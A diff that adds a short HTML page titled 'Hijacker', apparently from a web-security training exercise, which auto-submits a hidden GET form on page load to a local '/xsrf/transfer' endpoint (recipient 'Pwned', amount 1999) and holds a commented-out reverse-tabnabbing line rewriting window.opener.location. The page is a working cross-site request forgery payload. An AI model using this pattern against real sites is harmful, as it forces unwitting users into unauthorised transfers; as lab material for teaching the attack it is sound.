@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hijacker</title>
+</head>
+<body onload="document.forms['f1'].submit()">
+    <h1>Pwned</h1>
+
+    <form action="http://localhost:10001/xsrf/transfer" method="GET" name="f1">
+        <input type="text" value="Pwned" name="to">
+        <input type="text" value="1999" name="amount">
+    </form>
+
+    <script>
+    // First exercise
+    //    window.opener.location = "http://localhost:10002/xsrf"
+
+    // Second exercise
+    </script>
+</body>
+</html>
